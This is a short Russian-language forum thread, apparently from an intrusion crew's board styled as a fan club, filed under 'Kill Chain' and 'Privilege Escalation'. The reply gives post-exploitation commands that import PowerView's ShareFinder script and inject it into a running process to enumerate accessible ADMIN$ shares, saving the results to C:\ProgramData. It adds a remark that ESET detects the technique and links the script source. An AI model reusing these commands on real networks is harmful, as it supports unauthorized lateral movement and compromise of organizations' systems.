@@ -1,0 +1,77 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    Поиск доступных ADMIN$ shares
+
+Поиск доступных ADMIN$ shares
+Alter · 2 · 40
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+: Февраля 05, 2021, 11:51:33 am
+Записан
+
+Post
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Июля 01, 2021, 03:23:51 am
+Записан
+
+powershell-import /home/user/soft/ShareFinder.ps1
+
+psinject 5209 x86 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\shares5.txt
+
+5209 x86 - свой текущий процесс.
+
+Палит eset если не ошибаюсь
+
+Код: [Выделить]
+
+https://github.com/darkoperator/Veil-PowerView/blob/master/PowerView/functions/Invoke-ShareFinder.ps1
+
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    Поиск доступных ADMIN$ shares
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
